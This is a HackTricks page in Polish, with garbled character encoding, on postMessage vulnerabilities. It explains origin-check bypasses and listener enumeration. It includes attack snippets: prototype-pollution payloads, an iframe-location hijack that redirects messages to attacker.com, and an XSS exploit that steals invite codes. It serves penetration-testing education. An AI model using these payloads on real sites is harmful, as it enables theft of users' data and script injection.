# WulnerowalnoÅ›ci PostMessage

## WulnerowalnoÅ›ci PostMessage

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## WyÅ›lij **PostMessage**

**PostMessage** uÅ¼ywa nastÄ™pujÄ…cej funkcji do wysyÅ‚ania wiadomoÅ›ci:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
ZauwaÅ¼, Å¼e **targetOrigin** moÅ¼e byÄ‡ '\*' lub adresem URL, takim jak _https://company.com._\
W **drugim scenariuszu** wiadomoÅ›Ä‡ moÅ¼e byÄ‡ wysÅ‚ana tylko do tej domeny (nawet jeÅ›li pochodzenie obiektu okna jest inne).\
JeÅ›li uÅ¼ywany jest **znak wieloznaczny**, wiadomoÅ›ci mogÄ… byÄ‡ wysyÅ‚ane do dowolnej domeny i zostanÄ… wysÅ‚ane do pochodzenia obiektu Window.

### Atakowanie iframe i znaku wieloznacznego w **targetOrigin**

Jak wyjaÅ›niono w [**tym raporcie**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/), jeÅ›li znajdziesz stronÄ™, ktÃ³ra moÅ¼e byÄ‡ **osadzona w iframe** (brak ochrony `X-Frame-Header`) i ktÃ³ra wysyÅ‚a **wraÅ¼liwe** wiadomoÅ›ci za pomocÄ… **postMessage** z uÅ¼yciem **znaku wieloznacznego** (\*), moÅ¼esz **zmodyfikowaÄ‡** pochodzenie **iframe** i **wyciec** wraÅ¼liwÄ… wiadomoÅ›Ä‡ do domeny kontrolowanej przez ciebie.\
ZauwaÅ¼, Å¼e jeÅ›li strona moÅ¼e byÄ‡ osadzona w iframe, ale **targetOrigin** jest **ustawiony na adres URL, a nie na znak wieloznaczny**, ten **trik nie zadziaÅ‚a**.
```markup
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## Wykorzystanie addEventListener

**`addEventListener`** to funkcja uÅ¼ywana przez JS do deklarowania funkcji, ktÃ³ra oczekuje na **`postMessages`**.\
BÄ™dzie uÅ¼ywany kod podobny do poniÅ¼szego:
```javascript
window.addEventListener("message", (event) => {
if (event.origin !== "http://example.org:8080")
return;

// ...
}, false);
```
ZauwaÅ¼ w tym przypadku, jak **pierwszÄ… rzeczÄ…**, ktÃ³rÄ… robi kod, jest **sprawdzanie pochodzenia**. Jest to niezwykle **waÅ¼ne**, zwÅ‚aszcza jeÅ›li strona ma wykonywaÄ‡ **jakiekolwiek czynnoÅ›ci wymagajÄ…ce uwagi** z otrzymanymi informacjami (takie jak zmiana hasÅ‚a). **JeÅ›li nie sprawdzi pochodzenia, atakujÄ…cy mogÄ… zmusiÄ‡ ofiary do wysyÅ‚ania dowolnych danych do tych punktÃ³w koÅ„cowych** i zmieniaÄ‡ hasÅ‚a ofiar (w tym przykÅ‚adzie).

### Wyliczanie

Aby **znaleÅºÄ‡ nasÅ‚uchiwacze zdarzeÅ„** na bieÅ¼Ä…cej stronie, moÅ¼na:

* **PrzeszukaÄ‡** kod JS w poszukiwaniu `window.addEventListener` i `$(window).on` (_wersja JQuery_)
* **WykonaÄ‡** w narzÄ™dziach deweloperskich konsoli: `getEventListeners(window)`

![](<../../.gitbook/assets/image (618) (1) (1).png>)

* **PrzejdÅº do** _Elements --> Event Listeners_ w narzÄ™dziach deweloperskich przeglÄ…darki

![](<../../.gitbook/assets/image (617).png>)

* UÅ¼yj **rozszerzenia przeglÄ…darki** takiego jak [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) lub [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Te rozszerzenia przeglÄ…darki bÄ™dÄ… **przechwytywaÄ‡ wszystkie wiadomoÅ›ci** i pokazywaÄ‡ je.

### Ominiecie sprawdzania pochodzenia

- Atrybut **`event.isTrusted`** jest uwaÅ¼any za bezpieczny, poniewaÅ¼ zwraca `True` tylko dla zdarzeÅ„ generowanych przez prawdziwe dziaÅ‚ania uÅ¼ytkownika. ChociaÅ¼ jest to trudne do obejÅ›cia, jeÅ›li jest poprawnie zaimplementowane, jego znaczenie w sprawdzaniu bezpieczeÅ„stwa jest godne uwagi.

- UÅ¼ycie metody **`indexOf()`** do walidacji pochodzenia w zdarzeniach PostMessage moÅ¼e byÄ‡ podatne na obejÅ›cie. PrzykÅ‚ad ilustrujÄ…cy tÄ™ podatnoÅ›Ä‡ to:

```javascript
("https://app-sj17.marketo.com").indexOf("https://app-sj17.ma")
```

- Metoda **`search()`** z `String.prototype.search()` jest przeznaczona do wyraÅ¼eÅ„ regularnych, a nie do ciÄ…gÃ³w znakÃ³w. Przekazanie czegokolwiek innego niÅ¼ wyraÅ¼enie regularne prowadzi do niejawnej konwersji na wyraÅ¼enie regularne, co czyni metodÄ™ potencjalnie niebezpiecznÄ…. Dzieje siÄ™ tak dlatego, Å¼e w wyraÅ¼eniach regularnych kropka (.) dziaÅ‚a jako znak wieloznaczny, umoÅ¼liwiajÄ…c obejÅ›cie walidacji za pomocÄ… specjalnie skonstruowanych domen. Na przykÅ‚ad:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- Funkcja **`match()`**, podobnie jak `search()`, przetwarza wyraÅ¼enia regularne. JeÅ›li wyraÅ¼enie regularne jest nieprawidÅ‚owo skonstruowane, moÅ¼e byÄ‡ podatne na obejÅ›cie.

- Funkcja **`escapeHtml`** ma na celu oczyszczenie danych wejÅ›ciowych poprzez unikanie znakÃ³w specjalnych. Jednak nie tworzy nowego obiektu z oczyszczonymi danymi, ale nadpisuje wÅ‚aÅ›ciwoÅ›ci istniejÄ…cego obiektu. To zachowanie moÅ¼e byÄ‡ wykorzystane. W szczegÃ³lnoÅ›ci, jeÅ›li obiekt moÅ¼na manipulowaÄ‡ w taki sposÃ³b, Å¼e jego kontrolowana wÅ‚aÅ›ciwoÅ›Ä‡ nie uwzglÄ™dnia `hasOwnProperty`, `escapeHtml` nie bÄ™dzie dziaÅ‚aÄ‡ zgodnie z oczekiwaniami. PrzykÅ‚ady poniÅ¼ej to ilustrujÄ…:

- Oczekiwane niepowodzenie:
```javascript
result = u({
message: "'\"<b>\\"
});
result.message // "&#39;&quot;&lt;b&gt;\"
```

- OminiÄ™cie oczyszczania:
```javascript
result = u(new Error("'\"<b>\\"));
result.message; // "'"<b>\"
```

W kontekÅ›cie tej podatnoÅ›ci obiekt `File` jest szczegÃ³lnie podatny ze wzglÄ™du na swojÄ… tylko do odczytu wÅ‚aÅ›ciwoÅ›Ä‡ `name`. Ta wÅ‚aÅ›ciwoÅ›Ä‡, gdy jest uÅ¼ywana w szablonach, nie jest oczyszczana przez funkcjÄ™ `escapeHtml`, co prowadzi do potencjalnych zagroÅ¼eÅ„ dla bezpieczeÅ„stwa.

- WÅ‚aÅ›ciwoÅ›Ä‡ `document.domain` w JavaScript moÅ¼e byÄ‡ ustawiona przez skrypt w celu skrÃ³cenia domeny, co pozwala na bardziej elastycznÄ… politykÄ™ tego samego pochodzenia w obrÄ™bie tej samej domeny nadrzÄ™dnej.

### OminiÄ™cie e.origin == window.origin

Podczas osadzania strony internetowej w **ramce sandbox** za pomocÄ… %%%<iframe sandbox="allow-scripts" src="https://example.com/iframe.php">%%%, waÅ¼ne jest zrozumienie, Å¼e pochodzenie ramki zostanie ustawione na `null`. Jest to szczegÃ³lnie istotne przy pracy z **atrybutami sandbox** i ich wpÅ‚ywem na bezpieczeÅ„stwo i funkcjonalnoÅ›Ä‡.

Poprzez okreÅ›lenie **`allow-popups`** w atrybucie sandbox, kaÅ¼de okno popup otwarte z ramki dziedziczy ograniczenia sandboxu swojego rodzica. Oznacza to, Å¼e chyba Å¼e jest rÃ³wnieÅ¼ zawarty atrybut **`allow-popups-to-escape-sandbox`**, pochodzenie okna popup jest rÃ³wnieÅ¼ ustawione na `null`, zgodnie z pochodzeniem ramki.

W rezultacie, gdy pod tymi warunkami otwarte jest okno popup i wiadomoÅ›Ä‡ jest wysyÅ‚ana z ramki do okna popup za pomocÄ… **`postMessage`**, zarÃ³wno nadawca, jak i odbiorca majÄ… ustawione pochodzenie na `null`. Sytuacja ta prowadzi do scenariusza, w ktÃ³rym **`e.origin == window.origin`** jest prawdziwe (`null == null`), poniewaÅ¼ zarÃ³wno ramka, jak i okno popup majÄ… takÄ… samÄ… wartoÅ›Ä‡ pochodzenia `null`.

Aby uzyskaÄ‡ wiÄ™cej informacji, **przeczytaj**:

{% content-ref url="bypassing-sop-with-iframes-1.md" %}
[bypassing-sop-with-iframes-1.md](bypassing-sop-with-iframes-1.md)
{% endcontent-ref %}

### OminiÄ™cie e.source

MoÅ¼na sprawdziÄ‡, czy wiadomoÅ›Ä‡ pochodzi z tego samego okna, w ktÃ³rym nasÅ‚uchuje skrypt (szczegÃ³lnie interesujÄ…ce dla **SkryptÃ³w zawartoÅ›ci z rozszerzeÅ„ przeglÄ…darki**), aby sprawdziÄ‡, czy wiadomoÅ›Ä‡ zostaÅ‚a wysÅ‚ana z tej samej strony:
```javascript
// If itâ€™s not, return immediately.
if( received_message.source !== window ) {
return;
}
```
MoÅ¼esz wymusiÄ‡, aby **`e.source`** wiadomoÅ›ci byÅ‚o null, tworzÄ…c **iframe**, ktÃ³ry **wysyÅ‚a** **postMessage** i jest **natychmiast usuwany**.

Aby uzyskaÄ‡ wiÄ™cej informacji, **przeczytaj:**

{% content-ref url="bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

### OminiÄ™cie nagÅ‚Ã³wka X-Frame

Aby przeprowadziÄ‡ te ataki, idealnie byÅ‚oby **umieÅ›ciÄ‡ stronÄ™ ofiary** wewnÄ…trz `iframe`. Jednak niektÃ³re nagÅ‚Ã³wki, takie jak `X-Frame-Header`, mogÄ… temu **zapobiec**.\
W takich scenariuszach nadal moÅ¼na uÅ¼yÄ‡ mniej dyskretnego ataku. MoÅ¼na otworzyÄ‡ nowÄ… kartÄ™ z podatnÄ… aplikacjÄ… internetowÄ… i komunikowaÄ‡ siÄ™ z niÄ…:
```markup
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### KradzieÅ¼ wiadomoÅ›ci wysÅ‚anej do dziecka przez zablokowanie strony gÅ‚Ã³wnej

Na poniÅ¼szej stronie moÅ¼esz zobaczyÄ‡, jak moÅ¼na ukraÅ›Ä‡ **wraÅ¼liwe dane postmessage** wysÅ‚ane do **dzieciÄ™cego iframe** przez **zablokowanie** strony **gÅ‚Ã³wnej** przed wysÅ‚aniem danych i wykorzystanie **XSS w dziecku** do **wycieku danych** przed ich otrzymaniem:

{% content-ref url="blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

### KradzieÅ¼ wiadomoÅ›ci poprzez modyfikacjÄ™ lokalizacji iframe

JeÅ›li moÅ¼esz umieÅ›ciÄ‡ stronÄ™ w iframe bez nagÅ‚Ã³wka X-Frame-Header, ktÃ³ra zawiera inne iframe, moÅ¼esz **zmieniÄ‡ lokalizacjÄ™ tego dziecka iframe**, wiÄ™c jeÅ›li otrzymuje **postmessage** wysÅ‚ane za pomocÄ… **wildcard**, atakujÄ…cy moÅ¼e **zmieniÄ‡** pochodzenie tego iframe na stronÄ™ **kontrolowanÄ…** przez niego i **ukraÅ›Ä‡** wiadomoÅ›Ä‡:

{% content-ref url="steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

### postMessage do Prototype Pollution i/lub XSS

W scenariuszach, w ktÃ³rych dane wysyÅ‚ane za pomocÄ… `postMessage` sÄ… wykonywane przez JS, moÅ¼esz **umieÅ›ciÄ‡ stronÄ™ w iframe** i **wykorzystaÄ‡** **zanieczyszczenie prototypu/XSS** wysyÅ‚ajÄ…c exploit za pomocÄ… `postMessage`.

Kilka **bardzo dobrze wyjaÅ›nionych atakÃ³w XSS za pomocÄ… `postMessage`** moÅ¼na znaleÅºÄ‡ pod adresem [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)

PrzykÅ‚ad ataku wykorzystujÄ…cego **zanieczyszczenie prototypu, a nastÄ™pnie XSS** za pomocÄ… `postMessage` do `iframe`:
```html
<html>
<body>
<iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document.getElementById('iframe_victim').contentWindow.postMessage('{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\\" />"}}}','*');
document.getElementById('iframe_victim').contentWindow.postMessage(JSON.stringify("refresh"), '*');
}

setTimeout(get_code, 2000);
</script>
</body>
</html>
```
Dla **wiÄ™cej informacji**:

* Link do strony o [**zanieczyszczeniu prototypu**](../deserialization/nodejs-proto-prototype-pollution/)
* Link do strony o [**XSS**](../xss-cross-site-scripting/)
* Link do strony o [**zanieczyszczeniu prototypu po stronie klienta do XSS**](../deserialization/nodejs-proto-prototype-pollution/#client-side-prototype-pollution-to-xss)

## Referencje

* [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)
* [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
* Do Ä‡wiczeÅ„: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
